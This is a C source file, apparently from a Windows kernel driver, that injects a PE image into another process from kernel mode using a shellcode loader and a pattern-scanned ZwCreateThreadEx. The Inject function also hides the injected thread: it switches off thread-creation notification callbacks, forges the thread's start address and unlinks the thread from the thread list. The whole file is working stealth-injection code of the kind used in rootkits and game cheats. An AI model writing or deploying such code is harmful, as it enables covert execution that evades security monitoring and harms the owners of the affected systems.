#pragma once

#include "Inject.h"
#include "Memory.h"
#include "ShellCode.h"
#include "ThreadHide.h"

EXTERN_C ULONG64 PsGetProcessSectionBaseAddress(PETHREAD pEthread);

typedef NTSTATUS(NTAPI* PFN_ZwCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID StartContext,
    IN ULONG CreateThreadFlags,
    IN SIZE_T ZeroBits OPTIONAL,
    IN SIZE_T StackSize OPTIONAL,
    IN SIZE_T MaximumStackSize OPTIONAL,
    IN PVOID AttributeList
    );

ULONG64 GetZwCreateThreadEx()
{
    UNICODE_STRING unFuncName = { 0 };
    RtlInitUnicodeString(&unFuncName, L"ZwCreateSymbolicLinkObject");

    PUCHAR pSearchBegin = MmGetSystemRoutineAddress(&unFuncName);
    if (0 == pSearchBegin)
    {
        return 0;
    }

    pSearchBegin += 5;
    
    // 48 8B C4 FA 48 83 
    for (ULONG i = 0; i < 0x100; i++)
    {
        if (0x48 == pSearchBegin[i] &&
            0x8B == pSearchBegin[i + 1] &&
            0xC4 == pSearchBegin[i + 2] &&
            0xFA == pSearchBegin[i + 3] &&
            0x48 == pSearchBegin[i + 4] &&
            0x83 == pSearchBegin[i + 5])
        {
            return pSearchBegin + i;
        }
    }

    return 0;
}

NTSTATUS Inject(HANDLE hPid, PUCHAR pBUffer, SIZE_T uSize)
{
    NTSTATUS lStatus = STATUS_SUCCESS;
    PUCHAR pFileBufferR0 = NULL;
    PUCHAR pFileBufferR3 = NULL;
    PUCHAR pShellcodeR3 = NULL;
    PUCHAR pImageBufferR3 = NULL;
    PEPROCESS pEprocess = NULL;
    KAPC_STATE apc_state = { 0 };
    HANDLE hThread = NULL;
    PVOID pThread = NULL;

    if (0 == uSize)
    {
        return STATUS_UNSUCCESSFUL;
    }

    lStatus = PsLookupProcessByProcessId(hPid, &pEprocess);
    if (!NT_SUCCESS(lStatus))
    {
        return lStatus;
    }

    if (STATUS_PENDING != PsGetProcessExitStatus(pEprocess))
    {
        return lStatus;
    }

    pFileBufferR0 = ExAllocatePool(PagedPool, uSize);
    if (!pFileBufferR0)
    {
        return STATUS_UNSUCCESSFUL;
    }
    memcpy(pFileBufferR0, pBUffer, uSize);

    PFN_ZwCreateThreadEx ZwCreateThreadEx = GetZwCreateThreadEx();

    KeStackAttachProcess(pEprocess, &apc_state);

    do
    {
        //给模块申请内存
        pFileBufferR3 = AllocateMemoryNoExecutable(hPid, uSize);
        if (!pFileBufferR3)
        {
            break;
        }
        DbgPrintEx(77, 0, "[dbg] pFileBufferR3: %p\r\n", pFileBufferR3);
        memcpy(pFileBufferR3, pFileBufferR0, uSize);
        
        //给shellcode申请内存
        pShellcodeR3 = AllocateMemoryExecutable(hPid, sizeof(loader));
        if (!pShellcodeR3)
        {
            break;
        }
        DbgPrintEx(77, 0, "[dbg] pShellcodeR3: %p\r\n", pShellcodeR3);
        memcpy(pShellcodeR3, loader, sizeof(loader));
        
        //+228
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pFileBufferR3;
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pFileBufferR3 + pDos->e_lfanew);
        ULONG64 uImageSize = (ULONG64)pNt->OptionalHeader.SizeOfImage;
        pImageBufferR3 = AllocateMemoryExecutable(hPid, uImageSize);
        if (!pImageBufferR3)
        {
            break;
        }
        memset(pImageBufferR3, 0, uImageSize);

        memset(&pShellcodeR3[0x228], 0x90, 5);
        pShellcodeR3[0x22D] = 0x48;
        pShellcodeR3[0x22E] = 0xB8;
        *(PULONG64)&pShellcodeR3[0x22F] = pImageBufferR3;

        if (!ZwCreateThreadEx)
        {
            break;
        }

        ULONG uOldMask = SetThreadNotification(0);//关闭线程回调
        lStatus = ZwCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), pShellcodeR3, pFileBufferR3, 0, 0, 0, 0, 0);
        if (!NT_SUCCESS(lStatus))
        {
            break;
        }

        SetThreadNotification(uOldMask);//回复线程回调

        lStatus = ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, *PsThreadType, KernelMode, &pThread, NULL);
        if (NT_SUCCESS(lStatus))
        {
            ModifyThreadStartAddr(pThread, PsGetProcessSectionBaseAddress(pEprocess) + 0x1234);//伪造线程入口点
            RemoveThreadFromList(pThread);//线程断链
            KeWaitForSingleObject(pThread, Executive, KernelMode, FALSE, NULL);
            ZwClose(hThread);
        }
        else
        {
            break;
        }
       
    } while (0);

    if (pThread)
    {
        ObDereferenceObject(pThread);
    }
    
    if (pShellcodeR3)
    {
        FreeMemory(hPid, pShellcodeR3, sizeof(loader));
    } 

    if (pFileBufferR3)
    {
        FreeMemory(hPid, pFileBufferR3, uSize);
    }

    KeUnstackDetachProcess(&apc_state);

    if (pFileBufferR0)
    {
        ExFreePool(pFileBufferR0);
    }

    if (pEprocess)
    {
        ObDereferenceObject(pEprocess);
    }

  

    return lStatus;
}